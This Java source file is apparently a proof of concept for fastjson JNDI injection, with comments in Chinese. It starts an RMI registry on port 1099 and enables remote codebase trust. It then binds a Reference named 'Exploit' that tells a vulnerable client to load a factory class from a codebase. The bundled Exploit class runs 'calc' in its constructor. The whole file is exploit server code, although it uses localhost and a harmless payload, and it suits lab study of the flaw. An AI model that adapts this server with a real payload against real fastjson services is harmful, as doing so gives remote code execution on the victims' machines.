package com.violin.busniss.error.fastjson.bug;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        //在本机1099端口开启rmi registry。
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        Registry registry = LocateRegistry.createRegistry(1099);
        //配置一个reference
        //第一个参数是className
        //第二个参数指定 Object Factory的类名,第三个参数是codebase，如果Object Factory在classpath 里面找不到则去codebase下载。
        //Object Factory类指定需要注意包路径，根据你的实际情况决定是否需要添加包名前缀。
        Reference reference = new Reference("Exploit", "serialize.Exploit", "rmi://127.0.0.1/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        //绑定远程对像到Exploit，实际上就是给Hashtable里面put这个key和value。
        registry.bind("Exploit", referenceWrapper);
    }

    class Exploit {
        public Exploit() throws IOException {
            //直接在构造方法中运行计算器
            Runtime.getRuntime().exec("calc");
        }
    }
}
